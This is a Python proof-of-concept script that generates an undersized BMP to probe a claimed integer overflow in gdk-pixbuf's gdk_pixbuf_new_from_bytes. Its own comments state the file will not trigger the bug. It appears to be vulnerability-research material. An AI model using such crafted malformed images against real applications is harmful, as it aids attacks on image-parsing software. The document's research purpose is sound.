#!/usr/bin/env python3
"""
PoC generator for VULN-001:
  Integer overflow in gdk_pixbuf_new_from_bytes (gdk-pixbuf-data.c:113)

The vulnerability (line 113):
  g_return_val_if_fail(
      g_bytes_get_size(data) >= width * height * (has_alpha ? 4 : 3), NULL);

With width=32768, height=32768, has_alpha=TRUE:
  32768 * 32768 * 4 = 4,294,967,296 — overflows signed 32-bit int to 0.
  So g_bytes_get_size(data) >= 0 is always true, passing any tiny GBytes.

IMPORTANT: gdk_pixbuf_new_from_bytes is NOT called by any image loader
(gdk-pixbuf-pixdata only calls gdk_pixbuf_new_from_file, which in turn
invokes the BMP/PNG/JPEG loaders — none of which call gdk_pixbuf_new_from_bytes).

This script constructs the best candidate image: a BMP with 32768x32768
claimed dimensions and intentionally minimal pixel data (54-byte header + 1 pixel).
Running it through gdk-pixbuf-pixdata will NOT trigger the overflow because
the BMP loader allocates memory through its own internal path, not via
gdk_pixbuf_new_from_bytes. The expected result is an error from the BMP loader
(file too short / OOM guard), not a heap overflow.

Output: vuln_001.bmp
"""

import struct
import os

OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_001.bmp")

# Target dimensions that trigger the integer overflow in gdk_pixbuf_new_from_bytes
WIDTH  = 32768   # 0x8000
HEIGHT = 32768   # 0x8000
# WIDTH * HEIGHT * 4 = 4,294,967,296 -> overflows int32 to 0

BITS_PER_PIXEL = 32   # 4 bytes per pixel (RGBA/BGRA)

# File header (14 bytes)
BF_TYPE       = b'BM'
HEADER_SIZE   = 14 + 40           # BITMAPFILEHEADER + BITMAPINFOHEADER
PIXEL_DATA    = b'\x00' * 4       # Tiny pixel payload — intentionally undersized
BF_SIZE       = HEADER_SIZE + len(PIXEL_DATA)
BF_RESERVED   = 0
BF_OFF_BITS   = HEADER_SIZE       # Pixel data starts right after headers

bitmapfileheader = struct.pack(
    '<2sIHHI',
    BF_TYPE,
    BF_SIZE,
    BF_RESERVED,
    BF_RESERVED,
    BF_OFF_BITS,
)

# Info header (40 bytes) — BITMAPINFOHEADER
BI_SIZE            = 40
BI_WIDTH           = WIDTH
BI_HEIGHT          = HEIGHT       # Positive = bottom-up
BI_PLANES          = 1
BI_BIT_COUNT       = BITS_PER_PIXEL
BI_COMPRESSION     = 0            # BI_RGB
BI_SIZE_IMAGE      = 0            # Valid to use 0 for BI_RGB
BI_X_PELS_PER_METER = 0
BI_Y_PELS_PER_METER = 0
BI_CLR_USED        = 0
BI_CLR_IMPORTANT   = 0

bitmapinfoheader = struct.pack(
    '<IiiHHIIiiII',
    BI_SIZE,
    BI_WIDTH,
    BI_HEIGHT,
    BI_PLANES,
    BI_BIT_COUNT,
    BI_COMPRESSION,
    BI_SIZE_IMAGE,
    BI_X_PELS_PER_METER,
    BI_Y_PELS_PER_METER,
    BI_CLR_USED,
    BI_CLR_IMPORTANT,
)

bmp_data = BF_TYPE + struct.pack('<I', BF_SIZE) + struct.pack('<HHI', BF_RESERVED, BF_RESERVED, BF_OFF_BITS) + bitmapinfoheader + PIXEL_DATA

# Re-assemble cleanly
bmp_data = bitmapfileheader + bitmapinfoheader + PIXEL_DATA

with open(OUTPUT_FILE, 'wb') as f:
    f.write(bmp_data)

print(f"[+] Written: {OUTPUT_FILE} ({len(bmp_data)} bytes)")
print(f"[+] Claimed dimensions: {WIDTH}x{HEIGHT} @ {BITS_PER_PIXEL}bpp")
print(f"[+] Actual pixel data: {len(PIXEL_DATA)} bytes")
print(f"[+] Expected pixel data for full image: {WIDTH * HEIGHT * (BITS_PER_PIXEL // 8)} bytes")
print()
print("[!] NOTE: This file will NOT trigger VULN-001.")
print("    gdk_pixbuf_new_from_bytes is not reachable from gdk-pixbuf-pixdata.")
print("    The BMP loader will reject this file as truncated or OOM-guard.")
print("    The real attack surface is applications that call gdk_pixbuf_new_from_bytes")
print("    directly with attacker-controlled width/height/data arguments.")
